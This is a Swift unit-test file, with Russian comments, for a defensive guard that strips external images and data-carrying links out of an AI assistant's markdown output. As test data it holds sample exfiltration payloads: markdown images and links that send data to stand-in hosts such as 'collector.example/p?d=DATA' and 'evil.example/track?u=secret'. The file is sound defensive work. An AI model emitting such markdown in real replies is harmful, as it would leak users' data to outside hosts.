// OutputEgressGuardTests.swift — задача 100, слой 3: обезвреживание внешних
// картинок/ссылок в выводе ассистента. Покрыто: блокировка внешней картинки и
// data-несущей ссылки, разрешённые хосты, легитимный markdown (относительные
// ссылки, якоря, mailto, wikilinks, fenced-код) остаётся цел, граничные случаи
// (пусто, битый URL) не роняют.

import XCTest
@testable import SecondBrain

final class OutputEgressGuardTests: XCTestCase {

    func testExternalImageWithDataQueryIsBlocked() {
        let text = "Смотри ![x](https://collector.example/p?d=DATA)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertFalse(result.contains("collector.example/p?d=DATA"))
        XCTAssertTrue(result.contains("[внешняя картинка заблокирована: collector.example]"))
    }

    func testImageOnAllowedHostIsKept() {
        let text = "Смотри ![x](https://notes.example/img.png)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: ["notes.example"])
        XCTAssertEqual(result, text)
    }

    func testExternalImageWithoutQueryIsStillBlocked() {
        // Картинки автозагружаются всегда — режем любой не-разрешённый внешний хост.
        let text = "![x](https://cdn.example/logo.png)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertTrue(result.contains("[внешняя картинка заблокирована: cdn.example]"))
    }

    func testDataCarryingExternalLinkIsDefangedKeepingText() {
        let text = "Подробности [здесь](https://evil.example/track?u=secret)."
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertTrue(result.contains("здесь (внешняя ссылка заблокирована: evil.example)"), result)
        XCTAssertFalse(result.contains("track?u=secret"))
    }

    func testDataCarryingLinkViaLongBase64TailIsDefanged() {
        let tail = String(repeating: "aGVsbG93b3JsZA", count: 3)
        let text = "[файл](https://evil.example/blob/\(tail))"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertTrue(result.contains("внешняя ссылка заблокирована: evil.example"), result)
    }

    func testDataCarryingLinkOnAllowedHostIsKept() {
        let text = "[здесь](https://notes.example/track?u=secret)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: ["notes.example"])
        XCTAssertEqual(result, text)
    }

    func testPlainExternalLinkWithoutDataIsKept() {
        // Короткая ссылка без query/userinfo/длинного хвоста — не похожа на эксфильтрацию.
        let text = "См. [сайт](https://example.com/about)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertEqual(result, text)
    }

    func testLocalhostLinksAreNeverBlocked() {
        let text = "[локально](http://localhost:8080/api?x=1) и [тоже](https://127.0.0.1/y?z=2)"
        let result = OutputEgressGuard.neutralize(text, allowedHosts: [])
        XCTAssertEqual(result, text)
    }

    func testRelativeAnchorMailtoAndWikilinksAreUntouched() {
        let cases = [
            "[файл](./notes/todo.md)",
            "[раздел](#top)",
            "[почта](mailto:a@b.com)",
            "[[Обычная заметка]]"
        ]
        for text in cases {
            XCTAssertEqual(OutputEgressGuard.neutralize(text, allowedHosts: []), text, text)
        }
    }

    func testURLInsideFencedCodeBlockIsUntouched() {
        let text = """
        Пример:
        ```
        ![x](https://evil.example/p?d=DATA)
        ```
        """
        XCTAssertEqual(OutputEgressGuard.neutralize(text, allowedHosts: []), text)
    }

    func testPlainTextCyrillicEmojiUnaffected() {
        let cases = [
            "Обычный ответ без ссылок и картинок.",
            "Кириллица, эмодзи 🎯 и тире — без изменений.",
            ""
        ]
        for text in cases {
            XCTAssertEqual(OutputEgressGuard.neutralize(text, allowedHosts: []), text, text)
        }
    }

    func testMalformedURLDoesNotCrash() {
        let cases = [
            "![x](not a url at all)",
            "[текст](http://)",
            "[текст](https://[::badbracket)"
        ]
        for text in cases {
            _ = OutputEgressGuard.neutralize(text, allowedHosts: [])
        }
    }
}
